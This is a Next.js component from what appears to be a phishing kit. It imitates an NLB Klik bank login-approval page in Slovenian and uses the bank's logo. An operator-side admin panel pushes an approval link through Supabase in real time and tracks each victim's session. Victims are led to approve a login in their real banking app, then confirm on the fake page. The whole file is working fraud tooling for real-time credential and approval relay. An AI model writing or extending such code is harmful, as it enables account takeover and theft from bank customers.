"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

// NLB Klik onay ekrani:
// 1) Admin baglanti gonderir (form_data.nlbApprovalLink) -> kolon "NLB Bekliyor"
// 2) Kullanici baglantiya tiklar -> NLB uygulamasi acilir, orada onaylar
// 3) Sayfaya donup "Potrdil sem" basar -> approvalStatus='nlb_confirmed'
//    (kolon: NLB Onaylandi) -> bekleme ekrani.
export function NlbOnayClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [saving, setSaving] = useState(false);
  const [ready, setReady] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setReady(true);
        return;
      }
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const fd = (data?.form_data ?? {}) as Record<string, unknown>;
      setSessionFormData(fd);
      // Eksikse 'bekliyor' durumuna cek ki admin kolonu "NLB Bekliyor" gostersin.
      if (fd.approvalStatus !== "nlb" && fd.approvalStatus !== "nlb_confirmed") {
        void supabase
          .from("sessions")
          .update({ form_data: { ...fd, approvalStatus: "nlb" } })
          .eq("id", sessionId);
      }
      setReady(true);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  // Admin linki sonradan guncellerse (sayfa acikken) canli al.
  useEffect(() => {
    if (supabase === null || !sessionId) return;
    const channel = supabase
      .channel(`nlb-onay-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const fd = (payload.new as { form_data?: Record<string, unknown> })?.form_data;
          if (fd && typeof fd === "object") setSessionFormData(fd);
        },
      )
      .subscribe();
    return () => {
      void supabase.removeChannel(channel);
    };
  }, [sessionId, supabase]);

  const approvalLink =
    typeof sessionFormData.nlbApprovalLink === "string"
      ? sessionFormData.nlbApprovalLink.trim()
      : "";

  async function handleConfirm() {
    if (!supabase || !sessionId || saving) return;
    setSaving(true);
    const nextFormData = { ...sessionFormData, approvalStatus: "nlb_confirmed" };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);
    if (error) {
      setSaving(false);
      return;
    }
    setSessionFormData(nextFormData);
    router.push(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4 bg-[#1a0b2e]">
        <ConfigMissing />
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4 bg-[#1a0b2e]">
        <p className="rounded-xl border border-white/20 bg-white/10 p-5 text-center text-sm text-white">
          Seje ni mogoče najti.
        </p>
      </div>
    );
  }

  return (
    <div
      className="fixed inset-0 z-[9999] flex min-h-[100dvh] w-full items-center justify-center overflow-y-auto p-4"
      style={{
        background:
          "radial-gradient(1200px 600px at 50% -10%, rgba(120,70,220,0.55), transparent 60%), linear-gradient(160deg, #2a1152 0%, #1a0b2e 55%, #0d0518 100%)",
      }}
    >
      <div className="w-full max-w-[440px] rounded-[28px] bg-white shadow-[0_30px_80px_-20px_rgba(0,0,0,0.7)] overflow-hidden">
        {/* NLB header */}
        <div className="flex items-center justify-between px-6 pt-6 pb-4 border-b border-gray-100">
          <img
            src="/bank-logos/slovenia/nlb-si.png"
            alt="NLB"
            className="h-9 w-auto object-contain"
          />
          <span className="text-[10px] font-bold uppercase tracking-widest text-[#5b21b6] bg-[#5b21b6]/10 px-2.5 py-1 rounded-full">
            NLB Klik
          </span>
        </div>

        <div className="px-6 py-8 sm:px-8 text-center">
          {/* Animasyonlu kalkan ikonu */}
          <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#6d28d9] to-[#411c83] shadow-[0_15px_35px_-10px_rgba(91,33,182,0.6)]">
            <svg viewBox="0 0 24 24" className="h-10 w-10 text-white" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l7 3v6c0 5-3.5 8.5-7 10-3.5-1.5-7-5-7-10V5l7-3z" />
              <path d="M9 12l2 2 4-4" />
            </svg>
          </div>

          <h1 className="text-[22px] font-extrabold text-gray-900 leading-tight">
            Potrditev prijave
          </h1>
          <p className="mt-2 text-sm text-gray-500 leading-relaxed">
            Za prijavo kliknite spodnjo povezavo in zahtevo potrdite v svoji
            mobilni aplikaciji <span className="font-semibold text-gray-700">NLB Klik</span>.
          </p>

          {/* Baglanti butonu - uygulamayi acar */}
          {approvalLink ? (
            <a
              href={approvalLink}
              className="mt-7 flex w-full items-center justify-center gap-2 rounded-2xl border-2 border-[#5b21b6] py-4 text-[15px] font-bold text-[#5b21b6] transition-all hover:bg-[#5b21b6]/5 active:scale-[0.98]"
            >
              <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7" />
                <path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7" />
              </svg>
              Odpri aplikacijo NLB Klik
            </a>
          ) : (
            <div className="mt-7 flex items-center justify-center gap-2 rounded-2xl border border-gray-200 bg-gray-50 py-4 text-[13px] font-semibold text-gray-400">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#5b21b6] opacity-60" />
                <span className="relative inline-flex rounded-full h-2 w-2 bg-[#5b21b6]" />
              </span>
              Čakanje na povezavo…
            </div>
          )}

          <p className="mt-4 text-[12px] text-gray-400 leading-relaxed">
            Po potrditvi v aplikaciji se vrnite na to stran in pritisnite
            spodnji gumb.
          </p>

          {/* Onayladim butonu -> bekleme ekrani */}
          <button
            type="button"
            onClick={handleConfirm}
            disabled={saving || !ready}
            className="mt-4 w-full rounded-2xl bg-gradient-to-r from-[#5b21b6] to-[#7c3aed] py-4 text-[15px] font-bold text-white shadow-[0_15px_35px_-10px_rgba(109,40,217,0.55)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
          >
            {saving ? "Potrjujem…" : "Potrdil sem"}
          </button>

          <p className="mt-4 text-[11px] text-gray-400 leading-relaxed">
            Če tega zahtevka niste sprožili vi, ga ne potrjujte.
          </p>
        </div>
      </div>
    </div>
  );
}
